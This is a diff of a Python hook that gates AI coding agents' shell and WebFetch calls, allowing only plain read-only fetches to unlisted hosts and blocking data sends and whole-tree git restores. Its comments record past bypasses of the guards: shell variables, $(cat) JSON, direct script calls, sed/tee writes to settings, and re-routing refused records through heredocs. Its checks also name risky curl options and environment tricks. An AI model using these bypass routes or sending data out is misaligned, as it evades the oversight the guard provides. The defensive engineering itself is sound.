+            name, eq, value = w[2:].partition("=")
+            if name in long_flag and not eq:
+                remote_name |= name == "remote-name"
+                spider |= name == "spider"
+                globoff |= name == "globoff"
+                continue
+            if name not in long_value:
+                return f"{tool} --{name} is not in the read-only fetch grammar"
+            if not eq:
+                if i >= len(words):
+                    return f"{tool} --{name} has no value"
+                value = words[i]
+                i += 1
+            opt = name
+        else:
+            cluster, opt, value = w[1:], None, None
+            for k, ch in enumerate(cluster):
+                if ch in short_flag:
+                    remote_name |= tool == "curl" and ch == "O"
+                    globoff |= tool == "curl" and ch == "g"
+                    continue
+                if ch not in short_value:
+                    return f"{tool} -{ch} is not in the read-only fetch grammar"
+                value = cluster[k + 1:]
+                if not value:
+                    if i >= len(words):
+                        return f"{tool} -{ch} has no value"
+                    value = words[i]
+                    i += 1
+                opt = ch
+                break
+            if opt is None:
+                continue
+        if opt in ("o", "output", "O", "output-document"):
+            outputs.append(value)
+            wget_named = True
+        elif opt in ("X", "request"):
+            if value.upper() not in _READ_METHODS:
+                return f"{tool} method {value or '(none)'} is not a read"
+        elif opt == "url":
+            urls.append(value)
+        elif opt in ("w", "write-out"):
+            if "output" in value.lower():
+                return "curl --write-out %output writes a file"
+            if value.startswith("@"):
+                return "curl --write-out @file reads a local file into the output"
+        elif not _NUMERIC_VALUE.match(value):
+            return f"{tool} {opt} takes a number, not {value!r}"
+    if not urls:
+        return f"{tool} names no URL"
+    for url in urls:
+        why = _fetch_url_refusal(url)
+        if why:
+            return why
+    # A name taken from the URL (curl -O, wget without -O) is relative to a
+    # working directory the guard does not follow: refused outright.
+    if remote_name:
+        return (f"curl -O names the file from the URL; write with -o <absolute path under "
+                f"{FETCH_SCRATCH_ROOT}> instead")
+    if tool == "wget" and not wget_named and not spider:
+        return (f"wget without -O names the file itself; use -O - or -O <absolute path under "
+                f"{FETCH_SCRATCH_ROOT}>")
+    # curl expands {a,b} and [1-9] in a URL and substitutes the match for #N in
+    # -o, so a curl that writes a file must turn globbing off.
+    if tool == "curl" and not globoff and any(o not in _NO_FILE_OUTPUTS for o in outputs):
+        return "curl writing a file needs -g (--globoff) so URL globbing cannot rename the destination"
+    for path in outputs:
+        if path in _NO_FILE_OUTPUTS:
+            continue
+        why = _fetch_destination_refusal(path)
+        if why:
+            return f"{tool} {why}"
+    return None
+
+
+def _filter_refusal(exe, words):
+    """None when a downstream stage is a known pure filter used without a writing
+    or executing option; otherwise why it is refused."""
+    if exe not in _FETCH_FILTERS:
+        return f"{exe} is not a known read-only filter, so it could run or store what the fetch returns"
+    rule = _FETCH_FILTERS[exe]
+    if rule == "one-operand":
+        if len([a for a in words[1:] if not a.startswith("-") or a == "-"]) > 1:
+            return f"{exe} with a second operand writes a file"
+    elif rule is not None and any(rule.match(a) for a in words[1:]):
+        return f"{exe} option would write a file or run a program"
+    return None
+
+
+def read_only_fetch_refusal(cmd):
+    """None if `cmd` is a plain read-only fetch whose unlisted URLs all pass the
+    open-read policy; otherwise the reason it is not."""
+    if NET_CLIENT.search(cmd):
+        return "an interpreter network client is not a plain fetch"
+    if _UNREADABLE.search(cmd):
+        return "the command carries a $-expansion, backtick or process substitution the guard cannot read"
+    if REMOTE_TARGET_RE.search(cmd):
+        return "a remote copy target is a send"
+    try:
+        tokens = shell_tokens(cmd)
+    except ValueError:
+        return "the command could not be parsed"
+    # No directory change is followed, so none is allowed: in any position, in
+    # a subshell or brace group, behind builtin/command/eval or a quote.
+    for t in tokens:
+        for piece in re.split(r"[\s;&|(){}<>!]+", t):
+            if piece.lstrip("\\").lower() in _DIRECTORY_CHANGERS:
+                return (f"a fetch to an unlisted host may not change directory ({piece}); "
+                        f"name an absolute destination under {FETCH_SCRATCH_ROOT} instead")
+    segments, current = [], []
+    for t in tokens:
+        if t in SHELL_BOUNDARIES:
+            segments.append(current)
+            current = []
+        else:
+            current.append(t)
+    segments.append(current)
+    fetches = 0
+    for seg in segments:
+        words = [w for w in seg if w not in ("(", ")", "{", "}")]
+        assignments = []
+        while words and (_ASSIGNMENT.match(words[0]) or words[0] in _COMMAND_KEYWORDS):
+            if _ASSIGNMENT.match(words[0]):
+                assignments.append(words[0])
+            words = words[1:]
+        # No assignment anywhere in a fetch command, even alone in its own
+        # segment: SSLKEYLOGFILE= appends to any path and PATH=. runs a local curl.
+        if assignments:
+            return (f"a variable assignment ({assignments[0].split('=', 1)[0]}=) can change "
+                    f"how a fetch connects or where it writes")
+        try:
+            words, redirects = shell_operands(words)
+        except ValueError:
+            return "the command could not be parsed"
+        for path in redirects:
+            if path != "/dev/null":
+                return (f"a fetch to an unlisted host may redirect output only to /dev/null, "
+                        f"not {path!r}; write with curl -o / wget -O <absolute path under "
+                        f"{FETCH_SCRATCH_ROOT}>")
+        if not words:
+            continue
+        exe = os.path.basename(words[0]).lower()
+        if exe == "tee":
+            if len(words) > 1:
+                return "tee may not write a file in a fetch command; use curl -o / wget -O"
+            continue
+        if exe in COMMAND_WRAPPERS and _SENDER_NAMES.intersection(command_executables(words)):
+            return f"a network client run through {exe} is not a plain fetch"
+        if exe in _SENDER_NAMES:
+            if exe not in READ_ONLY_FETCHERS:
+                return f"{exe} is not a plain fetch"
+            if words[0] != exe:
+                return f"{exe} must be named as a bare word, not {words[0]}, so the program run is the one judged"
+            why = _fetch_grammar_refusal(exe, words[1:])
+            if why:
+                return why
+            fetches += 1
+            continue
+        why = _filter_refusal(exe, words)
+        if why:
+            return why
+    if not fetches:
+        return "no curl or wget fetch in command position"
+    for url in urls_in(cmd):
+        if host_allowlisted(url_host(url)):
+            continue
+        why = webfetch_open_read_reason(url)
+        if why:
+            return why.replace("WebFetch ", "the fetch ").split(" — blocked")[0]
+    return None
+
 
 # ── THE DERIVED HOST LIST (2026-08-09, the "B" half of Joe's "build A and B") ─
 #
@@ -854,8 +1569,10 @@ def host_allowlisted(host):
 #
 # The guard's own stated job (see the header, class 4) is the EXFILTRATION
 # guard. A GET whose entire outbound payload is a URL is a different risk from a
-# POST that can carry a database, so it gets a different policy. KNOWN_HOSTS is
-# untouched and still governs Bash.
+# POST that can carry a database, so it gets a different policy. KNOWN_HOSTS
+# still governs every Bash command that SENDS; since 2026-10-07 a Bash curl/wget
+# that is a plain read-only fetch gets this same per-URL policy (see THE PLAIN
+# READ-ONLY FETCH above).
 #
 # WHAT THIS BUYS. Client verification needs the practice's own website, and
 # practice websites cannot be enumerated — there is a different one per client,
@@ -1170,7 +1887,7 @@ def direct_metered_dispatch(cmd):
         (re.compile(r"\bneonctl\b[^\n;&|]*\bbranches\s+create\b", re.I),
          "direct Neon branch create bypasses neon-disposable-branch admission"),
         (re.compile(r"\bgh\s+(?:workflow\s+run|run\s+rerun)\b", re.I),
-         "direct GitHub Actions dispatch bypasses the remote-CI budget gate"),
+         "direct GitHub Actions dispatch bypasses the remote-CI budget gate (job retry: ops/ci-rerun.sh RUN_ID --job JOB_ID)"),
     )
     for pattern, reason in patterns:
         if pattern.search(executable):
@@ -1324,10 +2041,104 @@ def broad_add_reason(cmd, cwd=None):
     return None
 
 
+def source_restore_reason(cmd, cwd=None):
+    """Compare whole-tree checkout/restore effects with HEAD before execution."""
+    from cmd_text import shell_tokens, shell_operands, SHELL_BOUNDARIES
+    try:
+        tokens, _ = shell_operands(shell_tokens(strip_inert_text(cmd)))
+    except ValueError:
+        return None
+    base = cwd or os.getcwd()
+    segments, words = [], []
+    for token in tokens + [';']:
+        if token in SHELL_BOUNDARIES:
+            if words:
+                segments.append(words)
+            words = []
+        else:
+            words.append(token)
+    for words in segments:
+        if words[0] == 'cd' and len(words) == 2:
+            base = _resolve_dir(words[1], base)
+            continue
+        if os.path.basename(words[0]) != 'git':
+            continue
+        directory = base
+        i = 1
+        while i < len(words):
+            if words[i] == '-C' and i + 1 < len(words):
+                directory = _resolve_dir(words[i + 1], directory)
+                i += 2
+            elif words[i].startswith('-C') and len(words[i]) > 2:
+                directory = _resolve_dir(words[i][2:], directory)
+                i += 1
+            else:
+                break
+        if i >= len(words) or words[i] not in {'checkout', 'restore'}:
+            continue
+        operation, args = words[i], words[i + 1:]
+        revision, paths = None, []
+        if operation == 'checkout':
+            if '--' not in args:
+                continue
+            split = args.index('--')
+            before = args[:split]
+            if any(arg in {'-b', '-B', '--orphan'} for arg in before):
+                continue
+            revisions = [arg for arg in before if not arg.startswith('-')]
+            if len(revisions) != 1:
+                continue
+            revision, paths = revisions[0], args[split + 1:]
+        else:
+            j = 0
+            while j < len(args):
+                arg = args[j]
+                if arg == '--':
+                    paths.extend(args[j + 1:])
+                    break
+                if arg in {'-s', '--source'} and j + 1 < len(args):
+                    revision = args[j + 1]
+                    j += 2
+                    continue
+                if arg.startswith('--source='):
+                    revision = arg.split('=', 1)[1]
+                elif not arg.startswith('-'):
+                    paths.append(arg)
+                j += 1
+        if not revision or any('$' in value or '`' in value for value in [directory, revision, *paths]):
+            continue
+        def git_read(*arguments):
+            return subprocess.check_output(
+                ['git', '-C', directory, *arguments], stderr=subprocess.DEVNULL,
+                timeout=2)
+        try:
+            root = git_read('rev-parse', '--show-toplevel').decode().strip()
+            whole_tree = any(path in {':/', ':(top)', ':(top).', '*'} or
+                             os.path.realpath(_resolve_dir(path, directory)) == os.path.realpath(root)
+                             for path in paths)
+            if not whole_tree:
+                continue
+            tree = git_read('rev-parse', '--verify', '--end-of-options', revision + '^{tree}').decode().strip()
+            changed = git_read('diff', '--no-ext-diff', '--name-only', '-z', 'HEAD', tree, '--', *paths)
+        except (OSError, subprocess.SubprocessError):
+            continue  # invalid Git requests fail in Git; preserve this guard's fail-open policy
+        if changed:
+            names = [path.decode('utf-8', errors='replace') for path in changed.split(b'\0') if path]
+            return ('whole-tree source replacement from ' + revision + ' changes tracked paths: '
+                    + json.dumps(names, ensure_ascii=False) + '. Use an explicit owned-path restore: '
+                    'git checkout <revision> -- <owned-path> [<owned-path>...]. '
+                    'Intentional destructive restores keep the existing destructive-action route.')
+    return None
+
+
 def check(cmd, cwd=None):
     """Return a reason string to block, or None to allow."""
     if cmd.strip() in ALLOW_EXACT:
         return None
+
+    reason = source_restore_reason(cmd, cwd)
+    if reason:
+        return reason
 
     reason = broad_add_reason(cmd, cwd)
     if reason:
@@ -1366,17 +2177,23 @@ def check(cmd, cwd=None):
             return f"{label} — blocked by the CARR unattended guard"
 
     if is_send_context(cmd):
-        for host in hosts_in(cmd):
-            # host_allowlisted covers KNOWN_HOSTS plus the record-derived client
-            # and lead domains. The Bash path gets NO equivalent of the WebFetch
-            # open-read class and must not: curl chooses its own method and body,
-            # so the length cap that makes an open GET safe buys nothing here.
-            # This path stays allowlist-only, by design.
-            if not host_allowlisted(host):
-                return (f"network send to an unrecognised host ({host}) — blocked by the "
-                        f"CARR unattended guard. Add it to KNOWN_HOSTS if it is legitimate, "
-                        f"or — if it is a client's own domain — check that they carry a "
-                        f"practice email and re-run ops/fetch-allowlist.py.")
+        # host_allowlisted covers KNOWN_HOSTS plus the record-derived client and
+        # lead domains. An unlisted host is still reachable by a PLAIN READ-ONLY
+        # FETCH (see read_only_fetch_refusal): Joe's 2026-10-07 ruling that
+        # research may use the whole internet. Anything that sends stays
+        # allowlist-only, by design.
+        unlisted = [h for h in hosts_in(cmd) if not host_allowlisted(h)]
+        if unlisted:
+            why = read_only_fetch_refusal(cmd)
+            if why is not None:
+                return (f"network send to an unrecognised host ({unlisted[0]}) — blocked by the "
+                        f"CARR unattended guard: {why}. A plain curl/wget GET or download "
+                        f"(no body, upload, header, cookie, credential or $-expansion) may reach "
+                        f"any public host, spelled `curl -q ...` or `wget --no-config --no-netrc ...`, "
+                        f"with no cd; it may write a file only with `curl -q -g -o <path>` or "
+                        f"`wget ... -O <path>` where <path> is a new file named by a literal absolute "
+                        f"path under {FETCH_SCRATCH_ROOT} (no glob, ~, $, # or '..', no symlink, not in "
+                        f"a repository); a command that SENDS data needs the host in KNOWN_HOSTS.")
 
     reason = render_write_target(cmd)
     if reason:
@@ -1390,175 +2207,157 @@ def check(cmd, cwd=None):
     return None
 
 
-def main():
-    try:
-        payload = json.load(sys.stdin)
-    except Exception as exc:                       # fail OPEN
-        log(f"ALLOW(parse-error) {exc}")
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from lib.hook_runtime import decision, run
+
+
+def _parse_error(exc):
+    log(f"ALLOW(parse-error) {exc}")
+    return 0
+
+
+def _decision_error(exc):
+    log(f"ALLOW(internal-error) {exc}")
+    return 0
+
+
+@decision(on_error=_decision_error)
+def decide(payload):
+    tool = payload.get("tool_name") or payload.get("toolName") or ""
+    ti = payload.get("tool_input") or payload.get("toolInput") or {}
+
+    # [2026-08-06, loop #163 closed on Joe's "Fix both now"] WebFetch joins
+    # the egress allowlist. Before this, `if tool != "Bash": sys.exit(0)`
+    # meant WebFetch reached ANY host while the identical curl was blocked —
+    # demonstrated live on 2026-08-03. Same KNOWN_HOSTS list, same tuning
+    # path (a block names the host to add). WebSearch is deliberately NOT
+    # gated: it reaches a search API, not an arbitrary host. Requires the
+    # settings matcher to include WebFetch — changed the same sitting.
+    if tool == "WebFetch":
+        url = (ti.get("url", "") if isinstance(ti, dict) else "") or ""
+        # urlsplit, not URL_RE, for the fetch path. The regex host class
+        # excludes ':' and '@', so `https://user:pass@evil.com/` captures
+        # "user" as the host — harmless while everything was deny-by-default,
+        # actively wrong now that a host can pass on policy rather than on a
+        # list. The Bash path below still uses URL_RE (it scans free text,
+        # where a parser has no single URL to parse).
+        try:
+            _p = urlsplit(url if url.startswith(("http://", "https://")) else f"https://{url}")
+            host = (_p.hostname or "").lower()
+        except Exception:
+            host = ""
+        if host and not host_allowlisted(host):
+            # Not on the list — fall through to the wider READ-ONLY class
+            # rather than refusing outright. This is the 2026-08-09 split:
+            # an allowlisted host keeps its unconditional pass, and anything
+            # else must satisfy the open-read policy instead.
+            reason = webfetch_open_read_reason(url)
+            if reason:
+                log(f"DENY {reason} :: {url[:200]}")
+                print(reason, file=sys.stderr)
+                sys.exit(2)
+            log(f"ALLOW(open-read) {host} :: {url[:200]}")
         sys.exit(0)
 
-    try:
-        tool = payload.get("tool_name") or payload.get("toolName") or ""
-        ti = payload.get("tool_input") or payload.get("toolInput") or {}
-
-        # [2026-08-06, loop #163 closed on Joe's "Fix both now"] WebFetch joins
-        # the egress allowlist. Before this, `if tool != "Bash": sys.exit(0)`
-        # meant WebFetch reached ANY host while the identical curl was blocked —
-        # demonstrated live on 2026-08-03. Same KNOWN_HOSTS list, same tuning
-        # path (a block names the host to add). WebSearch is deliberately NOT
-        # gated: it reaches a search API, not an arbitrary host. Requires the
-        # settings matcher to include WebFetch — changed the same sitting.
-        if tool == "WebFetch":
-            url = (ti.get("url", "") if isinstance(ti, dict) else "") or ""
-            # urlsplit, not URL_RE, for the fetch path. The regex host class
-            # excludes ':' and '@', so `https://user:pass@evil.com/` captures
-            # "user" as the host — harmless while everything was deny-by-default,
-            # actively wrong now that a host can pass on policy rather than on a
-            # list. The Bash path below still uses URL_RE (it scans free text,
-            # where a parser has no single URL to parse).
-            try:
-                _p = urlsplit(url if url.startswith(("http://", "https://")) else f"https://{url}")
-                host = (_p.hostname or "").lower()
-            except Exception:
-                host = ""
-            if host and not host_allowlisted(host):
-                # Not on the list — fall through to the wider READ-ONLY class
-                # rather than refusing outright. This is the 2026-08-09 split:
-                # an allowlisted host keeps its unconditional pass, and anything
-                # else must satisfy the open-read policy instead.
-                reason = webfetch_open_read_reason(url)
+    # Codex may expose the outer functions.exec wrapper or its nested
+    # exec_command. Apply the same shell policy to the literal command.
+    if tool in {"functions.exec", "exec_command"}:
+        # The native Bash guard pre-dates Codex and is intentionally global.
+        # This new Codex alias is CARR-only so it cannot change Life AI or
+        # another repository's workflow merely because they share Codex.
+        cwd = ((ti.get("workdir") or payload.get("cwd") or "")
+               if isinstance(ti, dict) else (payload.get("cwd") or ""))
+        try:
+            real_cwd = os.path.realpath(os.path.expanduser(cwd))
+        except Exception:
+            real_cwd = ""
+        if not (real_cwd == REPO or real_cwd.startswith(REPO + os.sep)
+                or "/CARR AI" in real_cwd):
+            # A task rooted elsewhere can still target CARR by absolute
+            # path.  Scope by the target too, otherwise a non-CARR cwd is
+            # an accidental bypass for the very files this guard protects.
+            raw = (ti if isinstance(ti, str) else
+                   ((ti.get("cmd") or ti.get("code") or "")
+                    if isinstance(ti, dict) else ""))
+            if REPO not in raw and not raw_targets_carr(raw):
+                reason = source_restore_reason(raw, cwd)
                 if reason:
-                    log(f"DENY {reason} :: {url[:200]}")
+                    log(f"DENY {reason} :: {raw[:300]}")
                     print(reason, file=sys.stderr)
                     sys.exit(2)
-                log(f"ALLOW(open-read) {host} :: {url[:200]}")
-            sys.exit(0)
+                sys.exit(0)
+        tool = "Bash"
+    if tool != "Bash":
+        sys.exit(0)
+    # Codex's local-function tool passes freeform JavaScript as a string;
+    # its embedded exec_command({cmd: ...}) must receive the same command
+    # inspection as a native Bash call. A dict remains the Claude shape.
+    cmd = (ti.get("command") or ti.get("cmd") or "") if isinstance(ti, dict) else ti
+    if not isinstance(cmd, str):
+        cmd = ""
+    if not cmd:
+        sys.exit(0)
 
-        # Codex may expose the outer functions.exec wrapper or its nested
-        # exec_command. Apply the same shell policy to the literal command.
-        if tool in {"functions.exec", "exec_command"}:
-            # The native Bash guard pre-dates Codex and is intentionally global.
-            # This new Codex alias is CARR-only so it cannot change Life AI or
-            # another repository's workflow merely because they share Codex.
-            cwd = ((ti.get("workdir") or payload.get("cwd") or "")
-                   if isinstance(ti, dict) else (payload.get("cwd") or ""))
-            try:
-                real_cwd = os.path.realpath(os.path.expanduser(cwd))
-            except Exception:
-                real_cwd = ""
-            if not (real_cwd == REPO or real_cwd.startswith(REPO + os.sep)
-                    or "/CARR AI" in real_cwd):
-                # A task rooted elsewhere can still target CARR by absolute
-                # path.  Scope by the target too, otherwise a non-CARR cwd is
-                # an accidental bypass for the very files this guard protects.
-                raw = (ti if isinstance(ti, str) else
-                       ((ti.get("cmd") or ti.get("code") or "")
-                        if isinstance(ti, dict) else ""))
-                if REPO not in raw and not raw_targets_carr(raw):
-                    sys.exit(0)
-            tool = "Bash"
-        if tool != "Bash":
-            sys.exit(0)
-        # Codex's local-function tool passes freeform JavaScript as a string;
-        # its embedded exec_command({cmd: ...}) must receive the same command
-        # inspection as a native Bash call. A dict remains the Claude shape.
-        cmd = (ti.get("command") or ti.get("cmd") or "") if isinstance(ti, dict) else ti
-        if not isinstance(cmd, str):
-            cmd = ""
-        if not cmd:
-            sys.exit(0)
+    # Effective cwd for the broad-add repo scope: the tool_input's own
+    # workdir (Codex), else the payload's cwd (Claude Code sends this for
+    # every Bash call), else this process's own cwd as a last resort.
+    effective_cwd = (
+        (ti.get("workdir") if isinstance(ti, dict) else None)
+        or payload.get("cwd") or os.getcwd())
 
-        # Effective cwd for the broad-add repo scope: the tool_input's own
-        # workdir (Codex), else the payload's cwd (Claude Code sends this for
-        # every Bash call), else this process's own cwd as a last resort.
-        effective_cwd = (
-            (ti.get("workdir") if isinstance(ti, dict) else None)
-            or payload.get("cwd") or os.getcwd())
+    reason = check(cmd, effective_cwd)
 
-        reason = check(cmd, effective_cwd)
+    # BYPASS AUDIT C33/C34 (2026-09-24), REDESIGNED (2026-09-24, Opus
+    # review). This hook used to re-run the four client verb gates
+    # client-side against a parsed `./run.sh call <verb> '<json>'`
+    # command (hooks/verb_gate_recheck.py, now deleted). A replay of
+    # 12,145 real Bash commands found the shell-text side of that
+    # approach fundamentally leaky (Jev: 0.93) — 62 legitimate commands
+    # would have been falsely denied (`git add -A <paths>`, a grep for
+    # the pattern text, fixture repos in /tmp…), and several trivial
+    # bypasses (a shell variable holding the verb, `$(cat f)` JSON,
+    # calling tools/call-verb.py or mcp-server/local-verb.mjs directly)
+    # could never be closed from Bash-command-text at all — every one of
+    # those doors recurses through the SAME server-side callTool(), so
+    # the checks now live in the verb handlers themselves
+    # (mcp-server/src/verb-gate-checks.js, wired into add-loop's handler
+    # in tools.js) and this hook no longer duplicates them. Jev agreed
+    # (0.94) that hosted CI is what actually stops a local-hook bypass
+    # from reaching main, which is the other reason a client-side
+    # regex recheck was the wrong enforcement point.
 
-        # BYPASS AUDIT C33/C34 (2026-09-24), REDESIGNED (2026-09-24, Opus
-        # review). This hook used to re-run the four client verb gates
-        # client-side against a parsed `./run.sh call <verb> '<json>'`
-        # command (hooks/verb_gate_recheck.py, now deleted). A replay of
-        # 12,145 real Bash commands found the shell-text side of that
-        # approach fundamentally leaky (Jev: 0.93) — 62 legitimate commands
-        # would have been falsely denied (`git add -A <paths>`, a grep for
-        # the pattern text, fixture repos in /tmp…), and several trivial
-        # bypasses (a shell variable holding the verb, `$(cat f)` JSON,
-        # calling tools/call-verb.py or mcp-server/local-verb.mjs directly)
-        # could never be closed from Bash-command-text at all — every one of
-        # those doors recurses through the SAME server-side callTool(), so
-        # the checks now live in the verb handlers themselves
-        # (mcp-server/src/verb-gate-checks.js, wired into add-loop's handler
-        # in tools.js) and this hook no longer duplicates them. Jev agreed
-        # (0.94) that hosted CI is what actually stops a local-hook bypass
-        # from reaching main, which is the other reason a client-side
-        # regex recheck was the wrong enforcement point.
-
-        # THE SHELL HALF OF rule 76a53dfe. A record refused at the vault must not
-        # simply be written somewhere the gate does not look, and a heredoc into
-        # a scratchpad was exactly that path. One shared memory with
-        # record-home-gate.py, so a record refused through either door is
-        # recognised at the other (rule a8c55a47: two doors, one module).
-        session = payload.get("session_id") or payload.get("sessionId") or ""
-        body = heredoc_body(cmd)
-        if reason and "vault markdown" in reason:
-            remember_refusal(body or cmd, session)
-        elif not reason and body:
-            hidden, share = was_refused(body, session)
-            if hidden:
-                log(f"DENY re-routed refused content ({share:.2f})")
-                print(REFUSAL.format(pct=round(share * 100)), file=sys.stderr)
-                sys.exit(2)
-
-        if not reason:
-            # THE GATE DOOR (loop #231, 2026-08-10). Runs only when nothing above
-            # denies, so a destructive shape (`rm -rf hooks/`) still DENIES on the
-            # stronger rule rather than being softened to an announcement here.
-            #
-            # Until today gate-edit-gate.py guarded Write/Edit on these files and
-            # its docstring claimed this file guarded the shell path. It did not —
-            # proven by firing the hook, not by reading it: append, sed -i, `>`
-            # onto settings.json and tee all returned ALLOW while the render
-            # control in the same run correctly DENIED. Shared matcher, one list,
-            # two doors (rule a8c55a47): hooks/gate_paths.py.
-            try:
-                sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-                from gate_paths import announcement, enforcement_write
-                hit = enforcement_write(cmd)
-                if hit:
-                    msg = announcement(hit, "a shell command")
-                    log(f"ANNOUNCE gate-write {hit} :: {cmd[:300]}")
-                    print(json.dumps({
-                        "systemMessage": msg,
-                        "hookSpecificOutput": {
-                            "hookEventName": "PreToolUse",
-                            "permissionDecision": "allow",
-                            "permissionDecisionReason": msg,
-                        },
-                    }))
-                    sys.exit(0)
-            except SystemExit:
-                raise
-            except Exception as exc:
-                log(f"ALLOW(gate-door-error) {exc}")
-
-        if reason:
-            log(f"DENY {reason} :: {cmd[:300]}")
-            # EXIT 2, NOT JSON, AND THE CHOICE MATTERS. The structured contract
-            # (exit 0 + hookSpecificOutput.permissionDecision) is richer, but it
-            # requires exit 0 — so on any build that does not parse the JSON, exit
-            # 0 reads as ALLOW and the gate fails open silently. Exit 2 blocks on
-            # every build and hands stderr back to the session as the reason. For
-            # a guard, degrading toward "blocked" beats degrading toward "allowed".
-            print(reason, file=sys.stderr)
+    # THE SHELL HALF OF rule 76a53dfe. A record refused at the vault must not
+    # simply be written somewhere the gate does not look, and a heredoc into
+    # a scratchpad was exactly that path. One shared memory with
+    # record-home-gate.py, so a record refused through either door is
+    # recognised at the other (rule a8c55a47: two doors, one module).
+    session = payload.get("session_id") or payload.get("sessionId") or ""
+    body = heredoc_body(cmd)
+    if reason and "vault markdown" in reason:
+        remember_refusal(body or cmd, session)
+    elif not reason and body:
+        hidden, share = was_refused(body, session)
+        if hidden:
+            log(f"DENY re-routed refused content ({share:.2f})")
+            print(REFUSAL.format(pct=round(share * 100)), file=sys.stderr)
             sys.exit(2)
-        sys.exit(0)
-    except Exception as exc:                       # fail OPEN
-        log(f"ALLOW(internal-error) {exc}")
-        sys.exit(0)
+
+    if reason:
+        log(f"DENY {reason} :: {cmd[:300]}")
+        # EXIT 2, NOT JSON, AND THE CHOICE MATTERS. The structured contract
+        # (exit 0 + hookSpecificOutput.permissionDecision) is richer, but it
+        # requires exit 0 — so on any build that does not parse the JSON, exit
+        # 0 reads as ALLOW and the gate fails open silently. Exit 2 blocks on
+        # every build and hands stderr back to the session as the reason. For
+        # a guard, degrading toward "blocked" beats degrading toward "allowed".
+        print(reason, file=sys.stderr)
+        sys.exit(2)
+    sys.exit(0)
+
+
+def main():
+    sys.exit(run(decide, parse_error=_parse_error))
 
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
